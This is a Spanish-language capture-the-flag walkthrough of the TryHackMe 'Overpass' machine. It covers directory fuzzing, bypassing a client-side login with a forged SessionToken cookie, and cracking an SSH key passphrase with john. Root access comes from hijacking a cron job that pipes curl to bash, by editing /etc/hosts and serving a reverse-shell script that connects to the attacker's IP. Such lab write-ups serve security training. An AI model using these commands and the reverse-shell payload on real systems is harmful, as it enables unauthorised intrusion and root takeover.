# Overpass - TryHackMe
**Dominio:** overpass.thm

## Enumeración
```bash
wfuzz -c -L -t 400 --sc=200,301 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://overpass.thm/FUZZ
```
Descubrimos `/admin`, un login.

## Foothold - autenticación rota
El login valida en el cliente. Agregando manualmente una cookie `SessionToken` con cualquier valor, el panel nos deja pasar y expone una clave SSH privada (`id_rsa`).
```bash
/usr/share/john/ssh2john.py id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# passphrase: james13
ssh -i id_rsa james@overpass.thm
```

## Escalada - cron + hijack de dominio
```bash
cat /etc/crontab
# * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
Root ejecuta cada minuto un script descargado desde `overpass.thm`. Como `/etc/hosts` es escribible, apuntamos el dominio a nuestra IP y servimos un `buildscript.sh` malicioso:
```bash
# en la víctima:
echo "<mi_ip> overpass.thm" >> /etc/hosts

# en nuestra máquina:
mkdir -p overpass_root/downloads/src
echo '#!/bin/bash
bash -i >& /dev/tcp/<mi_ip>/4444 0>&1' > overpass_root/downloads/src/buildscript.sh
python3 -m http.server 80
nc -lvnp 4444
```
El cron ejecuta nuestro script como root → shell root.
